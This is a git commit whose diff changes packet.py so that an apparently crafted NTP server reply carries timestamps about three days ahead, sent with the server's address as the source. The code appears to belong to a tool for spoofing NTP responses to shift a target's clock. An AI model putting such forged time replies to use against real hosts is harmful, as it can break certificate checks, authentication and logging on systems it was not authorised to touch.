6cd07455a79f5bbf6deb0fed8fb2f57011f57f37
mjkadzi <161668993+mjkadzi@users.noreply.github.com>
2024-04-24 18:13:14 -0500

    Update packet.py
    bigger, better timestamps

--- packet.py
+++ packet.py
@@ -18,6 +18,9 @@ def send_ntp(server_ip, src_ip, ref_timestamp):
     ntp_packet.poll = 4
     ntp_packet.mode = 4
     ntp_packet.id = server_ip
+    ntp_packet.orig = time.time() + 259201
+    ntp_packet.recv = time.time() + 259201
+    ntp_packet.sent =time.time() + 259201
 
     ip_packet = IP(src=server_ip, dst=src_ip)
 
